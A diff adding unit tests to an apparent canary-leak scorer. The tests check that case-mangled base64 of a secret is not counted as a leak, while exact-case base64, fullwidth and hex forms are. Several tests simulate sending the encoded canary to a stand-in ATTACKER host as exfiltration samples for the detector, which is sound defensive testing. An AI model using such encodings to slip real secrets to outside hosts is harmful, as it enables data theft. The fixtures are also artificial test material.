@@ -247,6 +247,51 @@ def test_double_encoded_base64_of_hex_canary_is_missed() -> None:
     assert leaked(rec, CANARY, SPEC) is True
 
 
+# --- Base64 case-sensitivity (#13) ------------------------------------------
+#
+# Base64 is case-sensitive: a case-mangled lookalike decodes to DIFFERENT
+# bytes, so it must not be scored as the canary. Plaintext and hex stay
+# case-insensitive -- hex is genuinely case-insensitive, and plaintext folding
+# is the scorer's documented design.
+
+ISSUE13_CANARY = "CANARY-7f3a91c4"
+ISSUE13_B64 = base64.b64encode(ISSUE13_CANARY.encode()).decode()  # Q0FOQVJZLTdmM2E5MWM0
+
+
+def test_case_mangled_base64_is_not_a_leak() -> None:
+    # The exact false positive from issue #13: the uppercased Base64 decodes
+    # to different bytes, not to the canary.
+    mangled = ISSUE13_B64.upper()  # Q0FOQVJZLTDMM2E5MWM0
+    assert mangled != ISSUE13_B64
+    assert base64.b64decode(mangled) != ISSUE13_CANARY.encode()
+    assert canary_present(mangled, ISSUE13_CANARY) is False
+    rec = _record(_send(ATTACKER, f"payload={mangled}"))
+    assert leaked(rec, ISSUE13_CANARY, SPEC) is False
+
+
+def test_exact_case_base64_still_leaks() -> None:
+    # The true positive must survive: exact-case Base64 of the canary.
+    assert canary_present(ISSUE13_B64, ISSUE13_CANARY) is True
+    rec = _record(_send(ATTACKER, f"payload={ISSUE13_B64}"))
+    assert leaked(rec, ISSUE13_CANARY, SPEC) is True
+
+
+def test_fullwidth_base64_is_case_sensitive_too() -> None:
+    # NFKC maps fullwidth back to ASCII without changing case, so the
+    # exact-case fullwidth form is still caught ...
+    assert canary_present(_fullwidth(ISSUE13_B64), ISSUE13_CANARY) is True
+    # ... but the case-mangled fullwidth form must not be (#13 via NFKC).
+    assert canary_present(_fullwidth(ISSUE13_B64.upper()), ISSUE13_CANARY) is False
+
+
+def test_plaintext_and_hex_stay_case_insensitive() -> None:
+    # Plaintext folding is by design; hex is genuinely case-insensitive.
+    assert canary_present(CANARY.upper(), CANARY) is True
+    assert canary_present(CANARY.encode().hex().upper(), CANARY) is True
+    rec = _record(_send(ATTACKER, f"data:{CANARY.encode().hex().upper()}"))
+    assert leaked(rec, CANARY, SPEC) is True
+
+
 # --- metrics --------------------------------------------------------------
 
 
